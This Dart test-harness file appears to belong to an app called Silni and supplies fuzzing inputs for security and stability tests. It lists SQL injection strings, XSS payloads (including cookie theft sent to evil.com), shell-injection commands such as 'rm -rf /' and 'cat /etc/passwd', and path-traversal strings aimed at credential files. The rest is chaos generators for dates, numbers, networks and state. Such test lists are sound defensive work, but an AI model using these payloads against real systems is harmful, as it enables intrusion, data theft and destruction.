/// Adversarial Test Harness - "PROSECUTOR MODE"
///
/// This harness assumes the app is GUILTY and actively tries to break it.
/// Contains malicious inputs, edge cases, and chaos generators for comprehensive
/// security and stability testing.
library;

import 'dart:math';

// =============================================================================
// MALICIOUS INPUTS
// =============================================================================

/// Collection of malicious input strings for security and stability testing.
/// These inputs are designed to expose SQL injection, XSS, buffer overflows,
/// and other common vulnerabilities.
class MaliciousInputs {
  MaliciousInputs._();

  // ---------------------------------------------------------------------------
  // SQL INJECTION ATTEMPTS
  // ---------------------------------------------------------------------------

  /// Classic SQL injection payloads
  static const List<String> sqlInjection = [
    // Classic attacks
    "'; DROP TABLE relatives; --",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "'; DELETE FROM users WHERE '1'='1",
    "' UNION SELECT * FROM users --",
    "'; UPDATE users SET admin=1 WHERE '1'='1",
    "1'; EXEC xp_cmdshell('dir'); --",
    "'; INSERT INTO users VALUES('hacker','hacked'); --",

    // Blind SQL injection
    "' AND 1=1 --",
    "' AND 1=2 --",
    "' AND SUBSTRING(@@version,1,1)='5",
    "' AND (SELECT COUNT(*) FROM users) > 0 --",

    // Time-based blind injection
    "'; WAITFOR DELAY '00:00:05' --",
    "' AND SLEEP(5) --",
    "'; SELECT BENCHMARK(5000000,MD5('test')) --",

    // PostgreSQL specific (Supabase uses PostgreSQL)
    "'; SELECT pg_sleep(5); --",
    "' || pg_sleep(5) --",
    "'; COPY users TO '/tmp/users.txt'; --",

    // Second-order injection (stored for later execution)
    "admin'--",
    "admin' #",
    "admin'/*",

    // Numeric injection
    "1 OR 1=1",
    "1; DROP TABLE users",
    "-1 OR 1=1",
    "0 UNION SELECT 1,2,3",

    // JSON injection in PostgreSQL
    r"{'key': 'value', 'evil': true}",
    r"'; SELECT * FROM json_each((SELECT data FROM users)); --",
  ];

  // ---------------------------------------------------------------------------
  // XSS (Cross-Site Scripting) PAYLOADS
  // ---------------------------------------------------------------------------

  /// XSS attack vectors for testing input sanitization
  static const List<String> xssPayloads = [
    // Basic script injection
    '<script>alert("XSS")</script>',
    '<script>document.location="http://evil.com?c="+document.cookie</script>',
    '<script src="http://evil.com/xss.js"></script>',

    // Event handler injection
    '<img src="x" onerror="alert(\'XSS\')">',
    '<svg onload="alert(\'XSS\')">',
    '<body onload="alert(\'XSS\')">',
    '<div onmouseover="alert(\'XSS\')">hover me</div>',
    '<input onfocus="alert(\'XSS\')" autofocus>',
    '<marquee onstart="alert(\'XSS\')">',

    // Encoded XSS
    '&#x3C;script&#x3E;alert("XSS")&#x3C;/script&#x3E;',
    '%3Cscript%3Ealert(%22XSS%22)%3C/script%3E',
    '\\x3cscript\\x3ealert("XSS")\\x3c/script\\x3e',

    // SVG injection
    '<svg><script>alert("XSS")</script></svg>',
    '<svg/onload=alert("XSS")>',

    // Data URI injection
    '<a href="data:text/html,<script>alert(\'XSS\')</script>">click</a>',
    '<object data="data:text/html,<script>alert(\'XSS\')</script>">',

    // JavaScript pseudo-protocol
    '<a href="javascript:alert(\'XSS\')">click</a>',
    '<iframe src="javascript:alert(\'XSS\')">',

    // CSS-based XSS
    '<style>body{background:url("javascript:alert(\'XSS\')")}</style>',
    '<div style="background:url(javascript:alert(\'XSS\'))">',

    // HTML5 vector
    '<video><source onerror="alert(\'XSS\')">',
    '<audio src=x onerror="alert(\'XSS\')">',
    '<details open ontoggle="alert(\'XSS\')">',

    // Template injection
    '{{constructor.constructor("alert(1)")()}}',
    r'${alert("XSS")}',
    '#{alert("XSS")}',
  ];

  // ---------------------------------------------------------------------------
  // UNICODE EDGE CASES
  // ---------------------------------------------------------------------------

  /// Unicode strings that can cause parsing/display issues
  static const List<String> unicodeEdgeCases = [
    // Zero-width characters
    'test\u200Bname', // Zero-width space
    'test\u200Cname', // Zero-width non-joiner
    'test\u200Dname', // Zero-width joiner
    'test\uFEFFname', // Zero-width no-break space (BOM)

    // Right-to-left override (spoofing attacks)
    'test\u202Ename', // Right-to-left override
    'test\u202Dname', // Left-to-right override
    '\u202Eevil.exe.txt', // File name spoofing

    // Combining characters
    'e\u0301', // e + combining acute accent = e
    'a\u0300\u0301\u0302\u0303\u0304', // Multiple combining marks

    // Homograph attacks (lookalike characters)
    '\u0430\u0064\u006D\u0069\u006E', // Cyrillic 'a' + latin 'dmin'
    '\u0391\u0042\u0043', // Greek Alpha + Latin BC
    'p\u0430ypal.com', // Cyrillic 'a' looks like Latin 'a'

    // Arabic text (relevant for Silni)
    '\u0627\u0644\u0633\u0644\u0627\u0645', // Arabic "peace"
    '\u200F\u0645\u062D\u0645\u062F', // Right-to-left mark + Arabic name

    // Emoji edge cases
    '\u{1F468}\u200D\u{1F469}\u200D\u{1F467}', // Family emoji (ZWJ sequence)
    '\u{1F3FB}', // Skin tone modifier
    '\u{1F468}\u{1F3FF}', // Man with dark skin tone

    // Null and control characters
    'test\x00name', // Null byte
    'test\x01\x02\x03name', // SOH, STX, ETX
    'test\x7Fname', // DEL character
    'test\nname\r\nmore', // Mixed newlines

    // Overlong UTF-8 (security bypass)
    'test\xC0\xAFname', // Overlong slash
    'test\xE0\x80\xAFname', // Another overlong

    // Surrogate pairs
    '\uD800\uDC00', // Valid surrogate pair
    '\uD800', // Lone high surrogate (invalid)
    '\uDC00', // Lone low surrogate (invalid)

    // Special whitespace
    'test\u00A0name', // Non-breaking space
    'test\u2003name', // Em space
    'test\u2007name', // Figure space
    'test\u202Fname', // Narrow no-break space
  ];

  // ---------------------------------------------------------------------------
  // LENGTH EXTREMES
  // ---------------------------------------------------------------------------

  /// Empty string
  static const String empty = '';

  /// Single character
  static const String singleChar = 'a';

  /// Generate very long string
  static String veryLong(int length) => 'a' * length;

  /// Extremely long strings that might cause buffer overflows
  static String get megaLong => 'a' * 1000000; // 1MB of 'a's
  static String get kiloLong => 'a' * 1000; // 1KB of 'a's
  static String get standardMax => 'a' * 255; // Common VARCHAR max
  static String get textFieldMax => 'a' * 65535; // MySQL TEXT max
  static String get dbLimit => 'a' * 10485760; // 10MB (PostgreSQL text limit)

  /// Length boundary tests
  static List<int> get lengthBoundaries => [
    0,
    1,
    127,
    128,
    255,
    256,
    1023,
    1024,
    4095,
    4096,
    65535,
    65536,
    1048575,
    1048576,
  ];

  // ---------------------------------------------------------------------------
  // SPECIAL CHARACTERS
  // ---------------------------------------------------------------------------

  /// Strings with special characters that may break parsing
  static const List<String> specialCharacters = [
    // Path traversal
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '/etc/passwd',
    'C:\\Windows\\System32\\config\\SAM',

    // Null bytes and terminators
    'test\x00.txt',
    'name\x00suffix',

    // Shell metacharacters
    'test; rm -rf /',
    'test && cat /etc/passwd',
    'test | cat /etc/passwd',
    r'test `cat /etc/passwd`',
    r'test $(cat /etc/passwd)',
    'test > /dev/null',
    'test < /dev/null',

    // Quote injection
    "test'name",
    'test"name',
    'test`name',
    "test'''name",
    'test"""name',

    // Backslash and escapes
    r'test\name',
    r'test\\name',
    r'test\n\r\t',
    'test\\\\\\\\name',

    // Regex special characters
    'test.*name',
    r'test\d+name',
    'test[a-z]name',
    'test(group)name',
    'test{1,5}name',
    r'test^$name',

    // JSON special characters
    '{"key": "value"}',
    '{"malicious": true, "data": null}',
    '[1, 2, {"nested": "json"}]',
    '"string with \\"quotes\\""',

    // XML/HTML entities
    '&lt;script&gt;',
    '&amp;amp;',
    '&#x22;',
    '&#34;',

    // Format string attacks
    '%s%s%s%s%s%s%s%s%s%s',
    '%n%n%n%n%n',
    '%x%x%x%x',
    '{0}{1}{2}{3}',

    // Line terminators
    'line1\nline2',
    'line1\rline2',
    'line1\r\nline2',
    'line1\x0Bline2', // Vertical tab
    'line1\x0Cline2', // Form feed
  ];

  // ---------------------------------------------------------------------------
  // DANGEROUS NUMBERS
  // ---------------------------------------------------------------------------

  /// Numbers that may cause overflow or precision issues
  static const List<num> dangerousNumbers = [
    // Boundaries
    0,
    -0,
    1,
    -1,

    // Integer boundaries
    127, // int8 max
    128,
    -128, // int8 min
    -129,
    255, // uint8 max
    256,
    32767, // int16 max
    32768,
    -32768, // int16 min
    -32769,
    65535, // uint16 max
    65536,
    2147483647, // int32 max
    2147483648,
    -2147483648, // int32 min
    -2147483649,
    4294967295, // uint32 max
    4294967296,
    9007199254740991, // JS MAX_SAFE_INTEGER
    9007199254740992,
    9223372036854775807, // int64 max

    // Floating point special values
    double.infinity,
    double.negativeInfinity,
    double.nan,
    double.minPositive,
    double.maxFinite,

    // Precision edge cases
    0.1,
    0.2,
    0.3, // 0.1 + 0.2 != 0.3 in floating point
    1e-308, // Near min positive
    1e308, // Near max
    1.7976931348623157e+308, // Max double
    -1.7976931348623157e+308, // Min double (negative)
  ];

  /// Dangerous integer strings (for parsing)
  static const List<String> dangerousIntegerStrings = [
    '0',
    '-0',
    '9223372036854775807', // int64 max
    '9223372036854775808', // int64 max + 1 (overflow)
    '-9223372036854775808', // int64 min
    '-9223372036854775809', // int64 min - 1 (underflow)
    '18446744073709551615', // uint64 max
    '18446744073709551616', // uint64 max + 1
    '999999999999999999999999999999', // Huge number
    '1e100', // Scientific notation
    '0x7FFFFFFFFFFFFFFF', // Hex max int64
    '0xFFFFFFFFFFFFFFFF', // Hex max uint64
    '+1', // Leading plus
    '  42  ', // Whitespace
    '42.0', // Decimal
    '42.5', // Non-integer decimal
    'NaN',
    'Infinity',
    '-Infinity',
    '',
    'abc',
    '12abc',
    'abc12',
  ];

  // ---------------------------------------------------------------------------
  // RANDOM MALICIOUS INPUT GENERATOR
  // ---------------------------------------------------------------------------

  static final _random = Random();

  /// Get a random malicious input from any category
  static String randomMalicious() {
    final allInputs = <String>[
      ...sqlInjection,
      ...xssPayloads,
      ...unicodeEdgeCases,
      ...specialCharacters,
      empty,
      singleChar,
      kiloLong,
    ];
    return allInputs[_random.nextInt(allInputs.length)];
  }

  /// Fuzz a valid input by injecting malicious content
  static String fuzz(String validInput) {
    final fuzzTypes = [
      // Prepend malicious content
      () => '${randomMalicious()}$validInput',
      // Append malicious content
      () => '$validInput${randomMalicious()}',
      // Insert in middle
      () {
        if (validInput.isEmpty) return randomMalicious();
        final mid = validInput.length ~/ 2;
        return '${validInput.substring(0, mid)}${randomMalicious()}${validInput.substring(mid)}';
      },
      // Replace entirely
      () => randomMalicious(),
      // Double the input
      () => '$validInput$validInput',
      // Truncate
      () => validInput.isEmpty ? '' : validInput.substring(0, validInput.length ~/ 2),
      // Add null bytes
      () => '$validInput\x00malicious',
      // Unicode wrapping
      () => '\u202E$validInput', // Right-to-left override
    ];

    return fuzzTypes[_random.nextInt(fuzzTypes.length)]();
  }

  /// Generate a batch of fuzzed inputs
  static List<String> fuzzBatch(String validInput, {int count = 10}) {
    return List.generate(count, (_) => fuzz(validInput));
  }
}

// =============================================================================
// MALICIOUS DATES
// =============================================================================

/// Edge case dates that may cause issues with date parsing and calculations
class MaliciousDates {
  MaliciousDates._();

  /// Invalid date strings that should be rejected
  static const List<String> invalidDateStrings = [
    '',
    'not-a-date',
    '2024-13-01', // Invalid month
    '2024-01-32', // Invalid day
    '2024-02-30', // Invalid Feb day
    '2024-00-01', // Zero month
    '2024-01-00', // Zero day
    'null',
    'undefined',
    'NaN',
    '9999-99-99',
    '-001-01-01', // Negative year
    '2024/01/01', // Wrong format
    '01-01-2024', // Wrong order
    '2024-1-1', // Missing leading zeros
    '2024-01-01T99:99:99', // Invalid time
    '2024-01-01T00:00:00+99:00', // Invalid timezone
  ];

  /// Extreme dates that are valid but edge cases
  static List<DateTime> get extremeDates => [
    DateTime(0001, 1, 1), // Earliest practical date
    DateTime(9999, 12, 31), // Latest practical date
    DateTime(1970, 1, 1), // Unix epoch
    DateTime(1969, 12, 31, 23, 59, 59), // Before Unix epoch
    DateTime(2038, 1, 19, 3, 14, 7), // 32-bit Unix timestamp max
    DateTime(2038, 1, 19, 3, 14, 8), // Just after 32-bit overflow
    DateTime(1000, 1, 1), // Old date
    DateTime(3000, 1, 1), // Far future date
    DateTime.now(), // Current time
    DateTime.now().subtract(const Duration(days: 36500)), // 100 years ago
    DateTime.now().add(const Duration(days: 36500)), // 100 years from now
  ];

  /// Dates around DST transitions (can cause issues)
  static List<DateTime> get dstTransitionDates => [
    DateTime(2024, 3, 10, 1, 59, 59), // Just before US spring forward
    DateTime(2024, 3, 10, 2, 0, 0), // US spring forward
    DateTime(2024, 3, 10, 3, 0, 0), // Just after US spring forward
    DateTime(2024, 11, 3, 1, 59, 59), // Just before US fall back
    DateTime(2024, 11, 3, 2, 0, 0), // US fall back
  ];

  /// Leap year edge cases
  static List<DateTime> get leapYearDates => [
    DateTime(2024, 2, 29), // Valid leap day
    DateTime(2023, 2, 28), // Non-leap year end of Feb
    DateTime(2000, 2, 29), // Century leap year
    DateTime(1900, 2, 28), // Century non-leap year
    DateTime(2100, 2, 28), // Future century non-leap year
  ];

  /// Midnight and time boundary edge cases
  static List<DateTime> get timeBoundaryDates => [
    DateTime(2024, 1, 1, 0, 0, 0, 0), // Midnight exactly
    DateTime(2024, 1, 1, 23, 59, 59, 999), // Just before midnight
    DateTime(2024, 1, 1, 12, 0, 0), // Noon exactly
    DateTime(2024, 6, 30, 23, 59, 60), // Leap second (if supported)
  ];

  /// Month boundary dates
  static List<DateTime> get monthBoundaryDates => [
    DateTime(2024, 1, 31), // January end
    DateTime(2024, 2, 1), // February start
    DateTime(2024, 4, 30), // 30-day month end
    DateTime(2024, 5, 1), // Following month start
    DateTime(2024, 12, 31), // Year end
    DateTime(2025, 1, 1), // Year start
  ];

  /// All edge case dates combined
  static List<DateTime> get allEdgeCases => [
    ...extremeDates,
    ...dstTransitionDates,
    ...leapYearDates,
    ...timeBoundaryDates,
    ...monthBoundaryDates,
  ];
}

// =============================================================================
// NETWORK CHAOS
// =============================================================================

/// Simulates various network failure conditions
class NetworkChaos {
  NetworkChaos._();

  /// Types of network failures to simulate
  static const List<NetworkFailure> failures = [
    NetworkFailure.connectionTimeout,
    NetworkFailure.readTimeout,
    NetworkFailure.connectionRefused,
    NetworkFailure.connectionReset,
    NetworkFailure.noInternet,
    NetworkFailure.dnsFailure,
    NetworkFailure.sslHandshakeFailure,
    NetworkFailure.http400,
    NetworkFailure.http401,
    NetworkFailure.http403,
    NetworkFailure.http404,
    NetworkFailure.http429,
    NetworkFailure.http500,
    NetworkFailure.http502,
    NetworkFailure.http503,
    NetworkFailure.http504,
    NetworkFailure.partialResponse,
    NetworkFailure.corruptedResponse,
    NetworkFailure.infiniteRedirect,
    NetworkFailure.slowResponse,
    NetworkFailure.intermittentFailure,
  ];

  static final _random = Random();

  /// Get a random network failure
  static NetworkFailure randomFailure() {
    return failures[_random.nextInt(failures.length)];
  }

  /// Simulate a specific failure probability
  static bool shouldFail({double probability = 0.3}) {
    return _random.nextDouble() < probability;
  }

  /// Generate a corrupted JSON response
  static String corruptedJson(String validJson) {
    final corruptions = [
      () => validJson.substring(0, validJson.length ~/ 2), // Truncated
      () => '$validJson}}}}', // Extra brackets
      () => validJson.replaceAll('"', "'"), // Wrong quotes
      () => '{corrupt: true', // Invalid JSON
      () => 'null', // Null response
      () => '', // Empty response
      () => validJson.replaceAll(':', '='), // Wrong separator
      () => '{"error": "Internal Server Error"}', // Error response
    ];
    return corruptions[_random.nextInt(corruptions.length)]();
  }
}

/// Types of network failures
enum NetworkFailure {
  connectionTimeout,
  readTimeout,
  connectionRefused,
  connectionReset,
  noInternet,
  dnsFailure,
  sslHandshakeFailure,
  http400,
  http401,
  http403,
  http404,
  http429,
  http500,
  http502,
  http503,
  http504,
  partialResponse,
  corruptedResponse,
  infiniteRedirect,
  slowResponse,
  intermittentFailure,
}

// =============================================================================
// STATE CHAOS
// =============================================================================

/// Simulates state corruption scenarios
class StateChaos {
  StateChaos._();

  static final _random = Random();

  /// Corrupt a Map by introducing invalid data
  static Map<String, dynamic> corruptMap(Map<String, dynamic> original) {
    final corrupted = Map<String, dynamic>.from(original);
    final corruptionTypes = [
      // Add unexpected null
      () => corrupted['random_field'] = null,
      // Add wrong type
      () => corrupted[corrupted.keys.first] = 12345,
      // Add nested corruption
      () => corrupted['nested_evil'] = {'deep': {'deeper': null}},
      // Add circular-like structure (as string)
      () => corrupted['circular'] = {'self': 'CIRCULAR_REF'},
      // Add extremely long value
      () => corrupted['long_value'] = MaliciousInputs.kiloLong,
      // Add malicious string
      () => corrupted['evil_string'] = MaliciousInputs.randomMalicious(),
      // Remove required field
      () {
        if (corrupted.isNotEmpty) {
          corrupted.remove(corrupted.keys.first);
        }
      },
      // Add list with mixed types
      () => corrupted['mixed_list'] = [1, 'two', null, true, {'nested': 'map'}],
    ];

    // Apply 1-3 corruptions
    final numCorruptions = _random.nextInt(3) + 1;
    for (var i = 0; i < numCorruptions; i++) {
      corruptionTypes[_random.nextInt(corruptionTypes.length)]();
    }

    return corrupted;
  }

  /// Generate a completely random/chaotic map
  static Map<String, dynamic> randomChaosMap({int depth = 3, int breadth = 5}) {
    if (depth == 0) {
      return {'value': MaliciousInputs.randomMalicious()};
    }

    final map = <String, dynamic>{};
    for (var i = 0; i < breadth; i++) {
      final key = 'key_${_random.nextInt(1000)}';
      final valueType = _random.nextInt(7);

      switch (valueType) {
        case 0:
          map[key] = null;
        case 1:
          map[key] = _random.nextBool();
        case 2:
          map[key] = MaliciousDates.extremeDates[_random.nextInt(MaliciousDates.extremeDates.length)].toIso8601String();
        case 3:
          map[key] = MaliciousInputs.dangerousNumbers[_random.nextInt(MaliciousInputs.dangerousNumbers.length)];
        case 4:
          map[key] = MaliciousInputs.randomMalicious();
        case 5:
          map[key] = List.generate(_random.nextInt(5), (_) => MaliciousInputs.randomMalicious());
        case 6:
          map[key] = randomChaosMap(depth: depth - 1, breadth: breadth ~/ 2);
      }
    }

    return map;
  }
}

// =============================================================================
// FUZZ TEST HELPER
// =============================================================================

/// Helper function to run fuzz tests with automatic error capturing
Future<FuzzTestResult> fuzzTest<T>({
  required String name,
  required List<dynamic> inputs,
  required T Function(dynamic input) testFunction,
  bool expectFailures = true,
}) async {
  final result = FuzzTestResult(name: name);

  for (final input in inputs) {
    try {
      testFunction(input);
      result.addSuccess(input);
    } catch (e, stackTrace) {
      result.addFailure(input, e, stackTrace);
    }
  }

  return result;
}

/// Result of a fuzz test run
class FuzzTestResult {
  final String name;
  final List<dynamic> successInputs = [];
  final List<FuzzTestFailure> failures = [];

  FuzzTestResult({required this.name});

  void addSuccess(dynamic input) {
    successInputs.add(input);
  }

  void addFailure(dynamic input, Object error, StackTrace stackTrace) {
    failures.add(FuzzTestFailure(input: input, error: error, stackTrace: stackTrace));
  }

  int get totalTests => successInputs.length + failures.length;
  int get successCount => successInputs.length;
  int get failureCount => failures.length;
  double get successRate => totalTests > 0 ? successCount / totalTests : 0.0;

  bool get allPassed => failures.isEmpty;
  bool get allFailed => successInputs.isEmpty && failures.isNotEmpty;

  @override
  String toString() {
    return 'FuzzTestResult($name): $successCount/$totalTests passed (${(successRate * 100).toStringAsFixed(1)}%)';
  }
}

/// Details of a single fuzz test failure
class FuzzTestFailure {
  final dynamic input;
  final Object error;
  final StackTrace stackTrace;

  FuzzTestFailure({
    required this.input,
    required this.error,
    required this.stackTrace,
  });

  @override
  String toString() {
    final inputStr = input.toString();
    final truncatedInput = inputStr.length > 100 ? '${inputStr.substring(0, 100)}...' : inputStr;
    return 'Input: $truncatedInput\nError: $error';
  }
}

// =============================================================================
// BOUNDARY VALUE HELPERS
// =============================================================================

/// Generates boundary values for testing integer fields
class BoundaryValues {
  BoundaryValues._();

  /// Get boundary values around a specific value
  static List<int> around(int value) => [
        value - 2,
        value - 1,
        value,
        value + 1,
        value + 2,
      ];

  /// Common integer boundaries
  static List<int> get standardIntegers => [
        -2147483648, // int32 min
        -1,
        0,
        1,
        2147483647, // int32 max
      ];

  /// Priority field boundaries (typically 1-3)
  static List<int> get priorities => [
        -1, // Invalid low
        0, // Invalid zero
        1, // Valid min
        2, // Valid mid
        3, // Valid max
        4, // Invalid high
        100, // Way too high
      ];

  /// Rating field boundaries (typically 1-5)
  static List<int> get ratings => [
        -1, // Invalid low
        0, // Invalid zero
        1, // Valid min
        3, // Valid mid
        5, // Valid max
        6, // Invalid high
        100, // Way too high
      ];

  /// Duration boundaries (minutes)
  static List<int> get durations => [
        -1, // Negative duration
        0, // Zero duration
        1, // Minimum meaningful
        60, // One hour
        1440, // One day
        10080, // One week
        525600, // One year
        2147483647, // Max int
      ];

  /// Streak boundaries
  static List<int> get streaks => [
        -1, // Negative
        0, // None
        1, // Starting
        7, // One week
        30, // One month
        100, // Milestone
        365, // One year
        1000, // Long streak
        2147483647, // Max int
      ];
}
